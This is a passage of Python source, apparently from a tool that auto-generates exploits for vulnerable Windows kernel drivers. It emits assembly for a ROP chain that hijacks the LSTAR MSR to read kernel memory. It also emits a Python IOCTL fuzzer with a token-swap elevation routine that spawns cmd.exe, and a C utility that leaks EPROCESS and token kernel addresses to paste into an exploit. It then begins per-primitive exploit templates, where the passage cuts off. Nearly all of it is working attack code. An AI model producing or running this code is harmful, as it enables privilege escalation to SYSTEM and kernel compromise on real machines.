    a.append('    or rax, 40000h')
    a.append('    push rax')
    a.append('    popfq')
    a.append('')
    a.append('    ; Load gadgets from ReadRopCtx')
    a.append('    mov rbx, [r14+00h]    ; pop_rcx_ret')
    a.append('    mov rsi, [r14+08h]    ; pop_rax_ret')
    a.append('    mov rdi, [r14+10h]    ; pop_rdx_ret')
    a.append('    mov rbp, [r14+18h]    ; wrmsr_ret')
    a.append('    mov r8,  [r14+20h]    ; read_gadget (mov rax,[rdx];ret)')
    a.append('    mov r9,  [r14+28h]    ; write_gadget (mov [rdx],rax;ret - store result)')
    a.append('    mov r10, [r14+30h]    ; iretq')
    a.append('    mov r11, [r14+38h]    ; origLSTAR')
    a.append('')
    a.append('    ; Build bottom-up')
    a.append('    ; --- iretq frame ---')
    a.append('    mov rax, 2Bh')
    a.append('    push rax              ; SS')
    a.append('    push r15              ; RSP')
    a.append('    pushfq                ; RFLAGS')
    a.append('    mov rax, 33h')
    a.append('    push rax              ; CS')
    a.append('    lea rax, ring3_read_resume')
    a.append('    push rax              ; RIP')
    a.append('    ; --- iretq gadget ---')
    a.append('    push r10              ; iretq')
    a.append('    ; --- wrmsr restore ---')
    a.append('    push rbp              ; wrmsr;ret')
    a.append('    mov rax, r11')
    a.append('    shr rax, 32')
    a.append('    push rax              ; origLSTAR.hi')
    a.append('    push rdi              ; pop rdx;ret')
    a.append('    mov rax, r11')
    a.append('    and eax, 0FFFFFFFFh')
    a.append('    push rax              ; origLSTAR.lo')
    a.append('    push rsi              ; pop rax;ret')
    a.append('    mov rax, 0C0000082h')
    a.append('    push rax              ; IA32_LSTAR -> RCX via pop')
    a.append('    push rbx              ; pop rcx;ret')
    a.append('    ; --- store result: pop rdx -> outBuf -> mov [rdx],rax;ret ---')
    a.append('    push r9               ; mov [rdx],rax;ret (write result)')
    a.append('    push r13              ; outBuf -> RDX via pop')
    a.append('    push rdi              ; pop rdx;ret')
    a.append('    ; --- read gadget: pop rdx -> targetVA -> mov rax,[rdx];ret ---')
    a.append('    push r8               ; mov rax,[rdx];ret')
    a.append('    push r12              ; targetVA -> RDX via pop')
    a.append('    push rdi              ; pop rdx;ret   <- LSTAR entry')
    a.append('')
    a.append('    mov eax, 0FFFFh')
    a.append('    syscall')
    a.append('')
    a.append('ring3_read_resume:')
    a.append('    popfq')
    a.append('    pop r15')
    a.append('    pop r14')
    a.append('    pop r13')
    a.append('    pop r12')
    a.append('    pop rbp')
    a.append('    pop rdi')
    a.append('    pop rsi')
    a.append('    pop rbx')
    a.append('    ret')
    a.append('DoKernelRead8 ENDP')
    a.append('')
    a.append('END')
    return '\n'.join(a) + '\n'


# ---------------------------------------------------------------------------
# Python emitter
# ---------------------------------------------------------------------------

def _emit_py(driver_name, device_path, entries):
    out = []
    out.append('"""')
    out.append('Auto-generated ctypes POC harness for: ' + driver_name)
    out.append('USE ON AUTHORIZED TARGETS ONLY.')
    out.append('Run: python ' + driver_name + '-poc.py <index>  |  python ' + driver_name + '-poc.py fuzz [iters]')
    out.append('"""')
    out.append('import ctypes, ctypes.wintypes as wt, os, random, sys')
    out.append('')
    out.append('kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)')
    out.append('CreateFileA = kernel32.CreateFileA')
    out.append('CreateFileA.restype = wt.HANDLE')
    out.append('CreateFileA.argtypes = [wt.LPCSTR, wt.DWORD, wt.DWORD, wt.LPVOID, wt.DWORD, wt.DWORD, wt.HANDLE]')
    out.append('DeviceIoControl = kernel32.DeviceIoControl')
    out.append('DeviceIoControl.restype = wt.BOOL')
    out.append('DeviceIoControl.argtypes = [wt.HANDLE, wt.DWORD, wt.LPVOID, wt.DWORD,')
    out.append('                            wt.LPVOID, wt.DWORD, ctypes.POINTER(wt.DWORD), wt.LPVOID]')
    out.append('')
    out.append('GENERIC_RW = 0xC0000000')
    out.append('OPEN_EXISTING = 3')
    out.append('INVALID = wt.HANDLE(-1).value')
    out.append('')
    out.append('DEVICE_PATH = b"' + device_path + '"')
    out.append('')
    out.append('def _pause():')
    out.append('    try: input("\\nPress Enter to exit...")')
    out.append('    except EOFError: pass')
    out.append('')
    out.append('def open_device():')
    out.append('    h = CreateFileA(DEVICE_PATH, GENERIC_RW, 3, None, OPEN_EXISTING, 0, None)')
    out.append('    if h == INVALID:')
    out.append('        err = ctypes.get_last_error()')
    out.append('        raise OSError(f"CreateFile {DEVICE_PATH!r} failed: WinError {err}")')
    out.append('    print(f"[+] Opened {DEVICE_PATH.decode()} -> handle {h:#x}")')
    out.append('    return h')
    out.append('')
    out.append('def ioctl(h, code, in_buf=b"", out_size=0x100):')
    out.append('    in_buf = bytes(in_buf)')
    out.append('    in_arr = (ctypes.c_ubyte * max(len(in_buf), 1))(*in_buf) if in_buf else None')
    out.append('    out_arr = (ctypes.c_ubyte * max(out_size, 1))()')
    out.append('    br = wt.DWORD(0)')
    out.append('    ok = DeviceIoControl(h, code,')
    out.append('                         ctypes.cast(in_arr, wt.LPVOID) if in_arr else None,')
    out.append('                         len(in_buf),')
    out.append('                         ctypes.cast(out_arr, wt.LPVOID), out_size,')
    out.append('                         ctypes.byref(br), None)')
    out.append('    return bool(ok), bytes(out_arr)[:br.value], br.value')
    out.append('')
    out.append('IOCTLS = [')
    for idx, code, method, tags, in_sz, out_sz in entries:
        out.append('    dict(idx=' + str(idx) + ', code=0x' + ('%08X' % code) +
                   ', method=' + repr(method) + ', tags=' + repr(tags) +
                   ', in_size=0x' + ('%X' % in_sz) +
                   ', out_size=0x' + ('%X' % out_sz) + '),')
    out.append(']')
    out.append('')
    out.append('def trigger(h, idx, payload=None, out_size=None):')
    out.append('    entry = IOCTLS[idx]')
    out.append('    code  = entry["code"]')
    out.append('    tags  = entry["tags"]')
    out.append('    print(f"[*] Triggering IOCTL 0x{code:08X} (Index: {idx})")')
    out.append('    if tags:')
    out.append('        print(f"    - Detected primitives: {", ".join(tags)}")')
    out.append('    in_buf = payload if payload is not None else b"\\x00" * entry["in_size"]')
    out.append('    sz_out = out_size if out_size is not None else entry["out_size"]')
    out.append('    ok, data, br = ioctl(h, code, in_buf, sz_out)')
    out.append('    print(f"    - ok={ok} br={br} out[:32]={data[:32].hex()}")')
    out.append('    return ok, data, br')
    out.append('')
    out.append('def fuzz(h, iters=1000):')
    out.append('    print(f"[>] Starting structured fuzzing for {iters} iterations...")')
    out.append('    interesting_sizes = [0, 1, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096]')
    out.append('    interesting_vals = [b"\\x00", b"\\xff", b"\\x41", b"\\xde\\xad\\xbe\\xef"]')
    out.append('    for i in range(iters):')
    out.append('        for e in IOCTLS:')
    out.append('            if random.random() < 0.3:')
    out.append('                sz = random.choice(interesting_sizes)')
    out.append('                val = random.choice(interesting_vals)')
    out.append('                buf = val * (sz // len(val) if len(val) > 0 else 1)')
    out.append('                buf = buf[:sz]')
    out.append('            else:')
    out.append('                sz = random.randint(1, 0x2000)')
    out.append('                buf = os.urandom(sz)')
    out.append('            out_sz = random.choice(interesting_sizes) if random.random() < 0.3 else random.randint(1, 0x2000)')
    out.append('            try:')
    out.append('                print(f"Iter {i} | IOCTL 0x{e[\'code\']:08X} | in_len={len(buf)} | out_len={out_sz}")')
    out.append('                ioctl(h, e["code"], buf, out_sz)')
    out.append('            except OSError as ex:')
    out.append('                print(f"[!] IOCTL 0x{e[\'code\']:08X} failed: {ex}")')
    out.append('                pass')
    out.append('    print("[+] Fuzz done.")')
    out.append('')
    out.append('def probe_all(h):')
    out.append('    print(f"[>] Probing {len(IOCTLS)} IOCTLs with zero-filled buffer (sanity sweep)...")')
    out.append('    hits = 0')
    out.append('    for e in IOCTLS:')
    out.append('        try:')
    out.append('            ok, data, br = ioctl(h, e["code"], b"\\x00" * e["in_size"], e["out_size"])')
    out.append('        except OSError as ex:')
    out.append('            print(f"  [{e[\'idx\']:3d}] 0x{e[\'code\']:08X} EXC {ex}")')
    out.append('            continue')
    out.append('        err = ctypes.get_last_error() if not ok else 0')
    out.append('        marker = "OK " if ok else "ERR"')
    out.append('        if ok: hits += 1')
    out.append('        print(f"  [{e[\'idx\']:3d}] 0x{e[\'code\']:08X} {e[\'method\']:18s} {marker} br={br:<5d} winerr={err}")')
    out.append('    print(f"[+] Probe done. {hits}/{len(IOCTLS)} returned success.")')
    out.append('')
    out.append('def exploit_elevate(h):')
    out.append('    print("[>] Attempting elevation via detected primitives...")')
    out.append('    # Check for direct elevation IOCTLs')
    out.append('    ELEV_TAGS = {"token_swap","ring0_exec","write_what_where","arb_increment","msr_rw","phys_mem"}')
    out.append('    elev = [e for e in IOCTLS if ELEV_TAGS & set(e["tags"])]')
    out.append('    if not elev:')
    out.append('        print("    [!] No elevation primitives detected.")')
    out.append('        return False')
    out.append('    for e in elev:')
    out.append('        tags = e["tags"]')
    out.append('        print(f"    [*] IOCTL 0x{e[\'code\']:08X} has primitives: {tags}")')
    out.append('    # Try token_swap / ring0_exec (direct PID-based)')
    out.append('    direct = [e for e in elev if "token_swap" in e["tags"] or "ring0_exec" in e["tags"]]')
    out.append('    if direct:')
    out.append('        pid = os.getpid()')
    out.append('        pid_buf = pid.to_bytes(4, "little").ljust(16, b"\\x00")')
    out.append('        for e in direct:')
    out.append('            for sz in [4, 8, 16]:')
    out.append('                try:')
    out.append('                    ok, data, br = ioctl(h, e["code"], pid_buf[:sz])')
    out.append('                    if ok:')
    out.append('                        print(f"    [+] Elevation IOCTL 0x{e[\'code\']:08X} triggered (size {sz})")')
    out.append('                        return True')
    out.append('                except OSError: pass')
    out.append('    # MSR/phys_mem/WWW require native shellcode -- use the C POC')
    out.append('    has_msr = any("msr_rw" in e["tags"] for e in elev)')
    out.append('    has_phys = any("phys_mem" in e["tags"] for e in elev)')
    out.append('    has_www = any("write_what_where" in e["tags"] for e in elev)')
    out.append('    if has_msr or has_phys or has_www:')
    out.append('        print("    [*] MSR/phys_mem/WWW primitives detected but require native exploit.")')
    out.append('        print("    [*] Use the C POC (poc.exe shell) for kernel-level elevation.")')
    out.append('        print("    [*] Or use the exploit templates file for manual exploitation.")')
    out.append('    return False')
    out.append('')
    out.append('def spawn_cmd(h):')
    out.append('    if exploit_elevate(h):')
    out.append('        print("[+] Elevation attempted. Spawning cmd.exe...")')
    out.append('    else:')
    out.append('        print("[*] No elevation. Spawning cmd.exe (unprivileged)...")')
    out.append('    os.system("cmd.exe")')
    out.append('')
    out.append('def main():')
    out.append('    print(f"[*] Target device: {DEVICE_PATH.decode()}")')
    out.append('    print(f"[*] Loaded {len(IOCTLS)} IOCTLs:")')
    out.append('    for e in IOCTLS:')
    out.append('        print(f"      {e[\'idx\']:3d} -> 0x{e[\'code\']:08X} {e[\'method\']:18s} tags={e[\'tags\']}")')
    out.append('    print()')
    out.append('    print("Usage: poc.py            (default: probe all once)")')
    out.append('    print("       poc.py <index>   (trigger one)")')
    out.append('    print("       poc.py fuzz [iters]")')
    out.append('    print()')
    out.append('    try:')
    out.append('        h = open_device()')
    out.append('    except OSError as e:')
    out.append('        print(f"[!] {e}")')
    out.append('        print("    Driver not loaded, wrong device name, or insufficient privileges (try elevated).")')
    out.append('        _pause()')
    out.append('        return 1')
    out.append('    try:')
    out.append('        if len(sys.argv) < 2:')
    out.append('            probe_all(h)')
    out.append('        elif sys.argv[1] in ("shell", "cmd"):')
    out.append('            spawn_cmd(h)')
    out.append('        elif sys.argv[1] == "fuzz":')
    out.append('            n = int(sys.argv[2]) if len(sys.argv) > 2 else 1000')
    out.append('            print(f"[>] Fuzzing {n} iterations across {len(IOCTLS)} IOCTLs...")')
    out.append('            fuzz(h, n)')
    out.append('            print("[+] Fuzz done.")')
    out.append('        else:')
    out.append('            trigger(h, int(sys.argv[1]))')
    out.append('    except Exception as e:')
    out.append('        import traceback')
    out.append('        traceback.print_exc()')
    out.append('        print(f"[!] {e}")')
    out.append('    _pause()')
    out.append('    return 0')
    out.append('')
    out.append('if __name__ == "__main__":')
    out.append('    sys.exit(main() or 0)')
    return "\n".join(out) + "\n"


# ---------------------------------------------------------------------------
# EPROCESS finder emitter
# ---------------------------------------------------------------------------

def _emit_eprocess_finder_c(driver_name, device_path, write_what_where_code, arb_inc_code):
    """Emit a standalone C utility that leaks kernel addresses and prints
    copy-paste defines for the main POC.

    write_what_where_code : IOCTL code for write-what-where (0 = not found)
    arb_inc_code          : IOCTL code for arbitrary increment (0 = not found)
    """
    wwwc = ('0x%08X' % write_what_where_code) if write_what_where_code else '0 /* not detected */'
    ainc = ('0x%08X' % arb_inc_code)          if arb_inc_code          else '0 /* not detected */'

    L = []
    def a(s): L.append(s)

    a('/*')
    a(' * Auto-generated EPROCESS / kernel-address finder for: ' + driver_name)
    a(' * Run on target (no elevation needed for basic info).')
    a(' * Build: cl /W3 /Zi ' + driver_name + '-eprocess-finder.c')
    a(' * USE ON AUTHORIZED TARGETS ONLY.')
    a(' */')
    a('#include <windows.h>')
    a('#include <winternl.h>')
    a('#include <stdio.h>')
    a('#include <stdint.h>')
    a('#include <stdlib.h>')
    a('#include <string.h>')
    a('')
    a('#pragma comment(lib, "advapi32.lib")')
    a('')
    a('static const char * const DEVICE_PATH = "' + device_path + '";')
    a('#define IOCTL_WRITE_WHAT_WHERE   ' + wwwc)
    a('#define IOCTL_ARB_INCREMENT      ' + ainc)
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * NtQuerySystemInformation shim')
    a(' * --------------------------------------------------------------------- */')
    a('typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);')
    a('static pfnNtQSI g_NtQSI;')
    a('')
    a('#define SystemModuleInformation         11')
    a('#define SystemExtendedHandleInformation 64')
    a('#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xC0000004L)')
    a('')
    a('typedef struct _RTL_MOD {')
    a('    HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize;')
    a('    ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex;')
    a('    USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256];')
    a('} RTL_MOD;')
    a('typedef struct _RTL_MODS { ULONG Count; RTL_MOD Modules[1]; } RTL_MODS;')
    a('')
    a('typedef struct _SYS_HANDLE_EX {')
    a('    PVOID     Object;')
    a('    ULONG_PTR UniqueProcessId;')
    a('    ULONG_PTR HandleValue;')
    a('    ULONG     GrantedAccess;')
    a('    USHORT    CreatorBackTraceIndex;')
    a('    USHORT    ObjectTypeIndex;')
    a('    ULONG     HandleAttributes;')
    a('    ULONG     Reserved;')
    a('} SYS_HANDLE_EX;')
    a('typedef struct _SYS_HANDLE_INFO_EX {')
    a('    ULONG_PTR NumberOfHandles;')
    a('    ULONG_PTR Reserved;')
    a('    SYS_HANDLE_EX Handles[1];')
    a('} SYS_HANDLE_INFO_EX;')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Helpers')
    a(' * --------------------------------------------------------------------- */')
    a('static SYS_HANDLE_INFO_EX *query_all_handles(void) {')
    a('    ULONG sz = 0x20000;')
    a('    for (;;) {')
    a('        SYS_HANDLE_INFO_EX *buf = malloc(sz);')
    a('        if (!buf) return NULL;')
    a('        ULONG out = 0;')
    a('        NTSTATUS st = g_NtQSI(SystemExtendedHandleInformation, buf, sz, &out);')
    a('        if (st == 0) return buf;')
    a('        free(buf);')
    a('        if (st != STATUS_INFO_LENGTH_MISMATCH) return NULL;')
    a('        sz = out + 0x1000;')
    a('    }')
    a('}')
    a('')
    a('static ULONG_PTR handle_to_kva(SYS_HANDLE_INFO_EX *hi, ULONG_PTR pid, HANDLE h) {')
    a('    ULONG_PTR hval = (ULONG_PTR)h;')
    a('    for (ULONG_PTR i = 0; i < hi->NumberOfHandles; i++) {')
    a('        SYS_HANDLE_EX *e = &hi->Handles[i];')
    a('        if (e->UniqueProcessId == pid && e->HandleValue == hval)')
    a('            return (ULONG_PTR)e->Object;')
    a('    }')
    a('    return 0;')
    a('}')
    a('')
    a('static ULONG_PTR get_ntoskrnl_base(char *disk_path_out, size_t path_sz) {')
    a('    RTL_MODS *m = malloc(0x40000);')
    a('    if (!m) return 0;')
    a('    NTSTATUS st = g_NtQSI(SystemModuleInformation, m, 0x40000, NULL);')
    a('    if (st) { free(m); return 0; }')
    a('    ULONG_PTR base = (ULONG_PTR)m->Modules[0].ImageBase;')
    a('    char *name = (char *)m->Modules[0].FullPathName + m->Modules[0].OffsetToFileName;')
    a('    snprintf(disk_path_out, path_sz, "C:\\\\Windows\\\\System32\\\\%s", name);')
    a('    free(m);')
    a('    return base;')
    a('}')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Build-specific offset table')
    a(' * Verify: dt nt!_EPROCESS UniqueProcessId ActiveProcessLinks Token')
    a(' *         dt nt!_TOKEN Privileges')
    a(' * --------------------------------------------------------------------- */')
    for line in _gen_c_off_table_v1():
        a(line)
    a('')
    a('static const OFFSETS *detect_offsets(void) {')
    a('    char buf[16] = {0};')
    a('    DWORD sz = sizeof(buf), build = 0;')
    a('    HKEY hk;')
    a('    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,')
    a('            "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion",')
    a('            0, KEY_READ, &hk) == 0) {')
    a('        RegQueryValueExA(hk, "CurrentBuildNumber", NULL, NULL, (LPBYTE)buf, &sz);')
    a('        RegCloseKey(hk);')
    a('        build = (DWORD)atoi(buf);')
    a('    }')
    a('    for (int i = 0; g_off_table[i].build != 0; i++)')
    a('        if (g_off_table[i].build == build) return &g_off_table[i];')
    a('    printf("[!] Build %lu not in table -- using fallback. VERIFY WITH WINDBG.\\n", build);')
    a('    return &g_off_table[sizeof(g_off_table)/sizeof(g_off_table[0]) - 1];')
    a('}')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Enable SeDebugPrivilege so OpenProcess(PID 4) succeeds when running as admin')
    a(' * --------------------------------------------------------------------- */')
    a('static void enable_sedebug(void) {')
    a('    HANDLE hTok; TOKEN_PRIVILEGES tp = {0};')
    a('    if (!OpenProcessToken(GetCurrentProcess(),')
    a('            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return;')
    a('    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);')
    a('    tp.PrivilegeCount = 1;')
    a('    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;')
    a('    AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);')
    a('    CloseHandle(hTok);')
    a('}')
    a('')
    a('/* -----------------------------------------------------------------------')
    a(' * Main')
    a(' * --------------------------------------------------------------------- */')
    a('int main(void) {')
    a('    g_NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),')
    a('                                        "NtQuerySystemInformation");')
    a('    enable_sedebug();')
    a('    printf("=== EPROCESS Finder -- ' + driver_name + ' ===\\n\\n");')
    a('')
    a('    const OFFSETS *off = detect_offsets();')
    a('    char bld_buf[16] = {0}; DWORD bld_sz = sizeof(bld_buf), build = 0; HKEY bk;')
    a('    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,')
    a('            "SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion",')
    a('            0, KEY_READ, &bk) == 0) {')
    a('        RegQueryValueExA(bk, "CurrentBuildNumber", NULL, NULL, (LPBYTE)bld_buf, &bld_sz);')
    a('        RegCloseKey(bk); build = (DWORD)atoi(bld_buf);')
    a('    }')
    a('    printf("[*] OS build:  %lu\\n", build);')
    a('    printf("[*] Offsets -- EPROCESS.UniqueProcessId=+0x%X  .ActiveProcessLinks=+0x%X  .Token=+0x%X\\n",')
    a('           off->pid, off->links, off->token);')
    a('    printf("[*]            TOKEN.Privileges.Present=+0x%X  .Enabled=+0x%X  .EnabledByDefault=+0x%X\\n\\n",')
    a('           off->priv, off->priv + 8, off->priv + 16);')
    a('')
    a('    ULONG_PTR pid = (ULONG_PTR)GetCurrentProcessId();')
    a('')
    a('    /* Open handles BEFORE snapshot so they appear in the table */')
    a('    HANDLE hSelf = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);')
    a('    HANDLE hTok  = NULL;')
    a('    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok);')
    a('    HANDLE hSys  = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);')
    a('')
    a('    SYS_HANDLE_INFO_EX *hi = query_all_handles();')
    a('    if (!hi) { puts("[!] NtQuerySystemInformation failed"); return 1; }')
    a('')
    a('    ULONG_PTR own_eprocess = handle_to_kva(hi, pid, hSelf);')
    a('    CloseHandle(hSelf);')
    a('    ULONG_PTR own_token = handle_to_kva(hi, pid, hTok);')
    a('    CloseHandle(hTok);')
    a('')
    a('    printf("[*] Own PID:             %llu\\n",  (unsigned long long)pid);')
    a('    printf("[*] Own EPROCESS:        0x%llx\\n", (unsigned long long)own_eprocess);')
    a('    printf("[*] Own TOKEN:           0x%llx\\n", (unsigned long long)own_token);')
    a('    printf("[*] EPROCESS.Token @:    0x%llx\\n",')
    a('           (unsigned long long)(own_eprocess + off->token));')
    a('    printf("[*] TOKEN.Priv.Present@: 0x%llx\\n\\n",')
    a('           (unsigned long long)(own_token + off->priv));')
    a('')
    a('    /* SYSTEM EPROCESS: hSys is a handle in OUR table pointing at PID 4 EPROCESS */')
    a('    ULONG_PTR system_eprocess = 0;')
    a('    if (hSys) {')
    a('        system_eprocess = handle_to_kva(hi, pid, hSys);')
    a('        CloseHandle(hSys);')
    a('    }')
    a('')
    a('    /* ntoskrnl base + PsInitialSystemProcess KVA */')
    a('    char disk_path[MAX_PATH];')
    a('    ULONG_PTR kbase = get_ntoskrnl_base(disk_path, sizeof(disk_path));')
    a('    ULONG_PTR psis_kva = 0;')
    a('    HMODULE hMod = LoadLibraryExA(disk_path, NULL, DONT_RESOLVE_DLL_REFERENCES);')
    a('    if (hMod) {')
    a('        ULONG_PTR uva = (ULONG_PTR)GetProcAddress(hMod, "PsInitialSystemProcess");')
    a('        if (uva) psis_kva = kbase + (uva - (ULONG_PTR)hMod);')
    a('        FreeLibrary(hMod);')
    a('    }')
    a('    printf("[*] ntoskrnl base:              0x%llx\\n", (unsigned long long)kbase);')
    a('    printf("[*] PsInitialSystemProcess KVA: 0x%llx\\n", (unsigned long long)psis_kva);')
    a('    if (system_eprocess)')
    a('        printf("[*] SYSTEM EPROCESS:            0x%llx\\n\\n", (unsigned long long)system_eprocess);')
    a('    else {')
    a('        printf("[!] SYSTEM EPROCESS: PID 4 open failed (err=%lu)\\n", GetLastError());')
    a('        printf("    WinDbg: poi(0x%llx)\\n\\n", (unsigned long long)psis_kva);')
    a('    }')
    a('')
    a('    /* ---- Copy-paste block ---- */')
    a('    printf("=== Copy-paste into ' + driver_name + r'''-poc.c ===\n");''')
    a('    printf("#define OWN_EPROCESS       0x%llxULL\\n", (unsigned long long)own_eprocess);')
    a('    printf("#define OWN_TOKEN_KVA      0x%llxULL\\n", (unsigned long long)own_token);')
    a('    printf("#define PSIS_KVA           0x%llxULL\\n", (unsigned long long)psis_kva);')
    a('    if (system_eprocess)')
    a('        printf("#define SYSTEM_EPROCESS    0x%llxULL\\n", (unsigned long long)system_eprocess);')
    a('    else')
    a('        printf("#define SYSTEM_EPROCESS    0x0ULL  /* run as admin to populate */\\n");')
    a('    printf("#define OFF_EPROCESS_TOKEN 0x%X\\n", off->token);')
    a('    printf("#define OFF_TOKEN_PRIV     0x%X\\n", off->priv);')
    a('    printf("/* Verify: dt nt!_EPROCESS Token  &&  dt nt!_TOKEN Privileges */\\n");')
    a('    printf("=======================================\\n");')
    a('')
    a('    free(hi);')
    a('    puts("\\nPress Enter to exit...");')
    a('    (void)getchar();')
    a('    return 0;')
    a('}')

    return "\n".join(L) + "\n"


# ---------------------------------------------------------------------------
# 13a: Structure-Inferred Buffer Layout
# ---------------------------------------------------------------------------

def _infer_buffer_struct(text, code, tags):
    """Analyze HLIL dereference patterns to reconstruct input buffer struct."""
    fields = []
    seen_offsets = set()

    # Pattern: *(type*)(SystemBuffer + offset) or *(type*)(buf + offset)
    deref_pats = [
        # *(uint64_t*)(buf + 0xNN)
        re.compile(r'\*\s*\(\s*(u?int(?:8|16|32|64)_t|ULONG|USHORT|UCHAR|PVOID|PULONG|DWORD|BYTE|WORD|QWORD)\s*\*\s*\)\s*\([^)]*\+\s*(0x[0-9a-fA-F]+|\d+)\s*\)', re.IGNORECASE),
        # buf[offset] style (array index)
        re.compile(r'\w+\[\s*(0x[0-9a-fA-F]+|\d+)\s*\]', re.IGNORECASE),
        # *(buf + offset) generic
        re.compile(r'\*\s*\([^)]*\+\s*(0x[0-9a-fA-F]+|\d+)\s*\)', re.IGNORECASE),
    ]

    # Type size mapping
    type_sizes = {
        'uint8_t': 1, 'uchar': 1, 'byte': 1, 'char': 1,
        'uint16_t': 2, 'ushort': 2, 'word': 2, 'short': 2,
        'uint32_t': 4, 'ulong': 4, 'dword': 4, 'int': 4, 'int32_t': 4,
        'uint64_t': 8, 'qword': 8, 'pvoid': 8, 'pulong': 8, 'int64_t': 8,
        'ulong_ptr': 8, 'size_t': 8,
    }

    for pat in deref_pats:
        for m in pat.finditer(text):
            groups = m.groups()
            if len(groups) >= 2:
                type_name = groups[0].lower()
                offset_str = groups[1]
            elif len(groups) == 1:
                type_name = None
                offset_str = groups[0]
            else:
                continue

            try:
                offset = int(offset_str, 16 if 'x' in offset_str.lower() else 10)
            except Exception:
                continue

            if offset > 0x1000 or offset in seen_offsets:
                continue
            seen_offsets.add(offset)

            size = type_sizes.get(type_name, 8) if type_name else 8
            fields.append({
                'offset': offset,
                'size': size,
                'type': type_name or 'uint64_t',
                'c_type': _to_c_type(type_name, size),
            })

    fields.sort(key=lambda f: f['offset'])

    # Annotate fields based on tags/context
    for f in fields:
        f['hint'] = ''
        if tags:
            if f['offset'] == 0:
                if 'write_what_where' in tags:
                    f['hint'] = 'target_addr'
                elif 'arb_read' in tags:
                    f['hint'] = 'src_addr'
                elif 'msr_rw' in tags:
                    f['hint'] = 'msr_index'
                elif 'port_io' in tags:
                    f['hint'] = 'port'
                elif 'phys_mem' in tags:
                    f['hint'] = 'phys_addr'
            elif f['offset'] == 8:
                if 'write_what_where' in tags:
                    f['hint'] = 'write_value'
                elif 'arb_read' in tags:
                    f['hint'] = 'read_size'
                elif 'msr_rw' in tags:
                    f['hint'] = 'msr_value'

    return fields


def _to_c_type(type_name, size):
    if type_name:
        type_map = {
            'uint8_t': 'uint8_t', 'uchar': 'uint8_t', 'byte': 'uint8_t',
            'uint16_t': 'uint16_t', 'ushort': 'uint16_t', 'word': 'uint16_t',
            'uint32_t': 'uint32_t', 'ulong': 'uint32_t', 'dword': 'uint32_t',
            'uint64_t': 'uint64_t', 'qword': 'uint64_t', 'pvoid': 'uint64_t',
        }
        return type_map.get(type_name.lower(), 'uint{}_t'.format(size * 8))
    return {1: 'uint8_t', 2: 'uint16_t', 4: 'uint32_t', 8: 'uint64_t'}.get(size, 'uint64_t')


def _emit_struct_header(entries_with_structs):
    """Emit C struct definitions for inferred buffer layouts."""
    out = []
    out.append('/* Auto-inferred IOCTL input buffer structures */')
    out.append('#pragma pack(push, 1)')
    out.append('')

    for idx, code, fields in entries_with_structs:
        if not fields:
            continue
        out.append('typedef struct _IOCTL_0x{:08X}_IN {{'.format(code))
        for f in fields:
            hint = '  // {}'.format(f['hint']) if f['hint'] else ''
            out.append('    {} field_{:x};{}'.format(f['c_type'], f['offset'], hint))
        total = max(f['offset'] + f['size'] for f in fields) if fields else 0
        out.append('}} IOCTL_{:08X}_IN;  // size: 0x{:X}'.format(code, total))
        out.append('')

    out.append('#pragma pack(pop)')
    return '\n'.join(out)


# ---------------------------------------------------------------------------
# 13b: Per-Primitive Exploit Templates
# ---------------------------------------------------------------------------

def _emit_exploit_templates(driver_name, device_path, entries):
    """Emit working exploit skeleton code for detected primitives."""
    L = []
    def a(s): L.append(s)

    a('/*')
    a(' * Exploit templates for: ' + driver_name)
    a(' * Each function is a near-complete exploit for a specific primitive.')
    a(' * Requires EPROCESS finder output for kernel addresses.')
    a(' * Build: cl /W3 /Zi ' + driver_name + '-exploit.c')
    a(' * USE ON AUTHORIZED TARGETS ONLY.')
    a(' */')
    a('#include <windows.h>')
    a('#include <stdio.h>')
    a('#include <stdint.h>')
    a('#include <string.h>')
    a('')
    a('/* --- Fill from EPROCESS finder output --- */')
    a('#define OWN_EPROCESS       0x0ULL')
    a('#define SYSTEM_EPROCESS    0x0ULL')
    a('#define NTOSKRNL_BASE      0x0ULL')
    a('#define OFF_EPROCESS_TOKEN 0x4b8')
    a('#define OFF_TOKEN_PRIV     0x40')
    a('#define OFF_ACTIVE_LINKS   0x448')
    a('#define OFF_PID            0x440')
    a('#define DEVICE_PATH        "' + device_path + '"')
    a('')
    a('static HANDLE g_dev = INVALID_HANDLE_VALUE;')
    a('')
    a('static int send_ioctl(DWORD code, void *in_buf, DWORD in_len,')
    a('                      void *out_buf, DWORD out_len) {')
    a('    DWORD br = 0;')
    a('    return DeviceIoControl(g_dev, code, in_buf, in_len, out_buf, out_len, &br, NULL);')
    a('}')
    a('')

    has_www = any('write_what_where' in tags for _, _, _, tags, _, _ in entries)
    has_read = any('arb_read' in tags for _, _, _, tags, _, _ in entries)
    has_msr = any('msr_rw' in tags for _, _, _, tags, _, _ in entries)
    has_phys = any('phys_mem' in tags for _, _, _, tags, _, _ in entries)
    has_ring0 = any('ring0_exec' in tags for _, _, _, tags, _, _ in entries)
    has_cr = any('cr_access' in tags for _, _, _, tags, _, _ in entries)
    has_port = any('port_io' in tags for _, _, _, tags, _, _ in entries)
    has_inc = any('arb_increment' in tags for _, _, _, tags, _, _ in entries)

